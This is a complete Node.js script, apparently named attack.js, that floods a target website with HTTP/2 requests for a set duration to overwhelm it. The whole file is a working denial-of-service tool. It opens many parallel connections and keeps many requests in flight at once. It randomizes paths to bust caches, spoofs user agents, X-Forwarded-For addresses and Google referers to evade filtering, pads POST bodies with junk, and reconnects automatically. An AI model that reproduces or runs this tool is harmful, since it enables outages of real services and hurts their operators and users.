const http2 = require('http2');
const readline = require('readline');
const os = require('os');

const MAX_INFLIGHT = 1000;
const CONNECTIONS = 20;
const REFRESH_RATE = 2000;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let rpsLastSecond = 0;
let maxRps = 0;
let end = 0;

const args = process.argv.slice(2);
if (args.length < 2) {
    console.log('Usage: node attack.js <https://target.com> <duration_secs>');
    process.exit(1);
}

const target = new URL(args[0]);
const duration = parseInt(args[1]);
end = Date.now() + duration * 1000;

function randomIP() {
    return `${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}.${rand(1, 255)}`;
}
function randomUA() {
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${rand(500,600)}.36 (KHTML, like Gecko) Chrome/${rand(80,120)}.0.${rand(1000,4000)}.100 Safari/${rand(500,600)}.36`;
}
function generatePayload() {
    return 'x='.repeat(rand(1000, 3000));
}
function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomPath() {
    return `/api/${Math.random().toString(36).substring(7)}?cacheBust=${Date.now()}`;
}

function sendFlood(client, inflight) {
    if (Date.now() > end || inflight.count >= MAX_INFLIGHT || client.destroyed) return;

    inflight.count++;

    const isPost = Math.random() > 0.5;
    const headers = {
        ':method': isPost ? 'POST' : 'GET',
        ':scheme': 'https',
        ':authority': target.hostname,
        ':path': randomPath(),
        'user-agent': randomUA(),
        'x-forwarded-for': randomIP(),
        'accept': '*/*',
        'referer': 'https://google.com',
        'origin': 'https://google.com',
        'content-type': 'application/x-www-form-urlencoded'
    };

    try {
        const req = client.request(headers);
        req.setTimeout(5000);
        req.on('response', () => {
            inflight.count--;
            successCount++;
            rpsLastSecond++;
            req.close();
        });
        req.on('error', () => {
            inflight.count--;
            errorCount++;
        });

        if (isPost) req.write(generatePayload());
        req.end();
        totalRequests++;
    } catch {
        inflight.count--;
        errorCount++;
    }

    setImmediate(() => sendFlood(client, inflight));
}

function createConnection() {
    if (Date.now() > end) return;

    const inflight = { count: 0 };
    let client;

    try {
        client = http2.connect(target.href);
        client.on('connect', () => {
            for (let i = 0; i < 50; i++) sendFlood(client, inflight);
        });
        client.on('error', () => {
            client.destroy();
            setTimeout(createConnection, 1000);
        });
        client.on('close', () => {
            setTimeout(createConnection, 1000);
        });
    } catch {
        setTimeout(createConnection, 1000);
    }
}

for (let i = 0; i < CONNECTIONS; i++) {
    createConnection();
}

setInterval(() => {
    const timeLeft = Math.max(0, (end - Date.now()) / 1000);
    const min = Math.floor(timeLeft / 60);
    const sec = Math.floor(timeLeft % 60);
    maxRps = Math.max(maxRps, rpsLastSecond);

    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(`🚀 HTTP/2 FLOOD`);
    console.log(`==============================`);
    console.log(`Total Requests : ${totalRequests}`);
    console.log(`Max RPS        : ${maxRps}`);
    console.log(`Success        : ${successCount}`);
    console.log(`Errors         : ${errorCount}`);
    console.log(`Time Remaining : ${min}:${sec < 10 ? '0' : ''}${sec}`);
    rpsLastSecond = 0;
}, REFRESH_RATE);
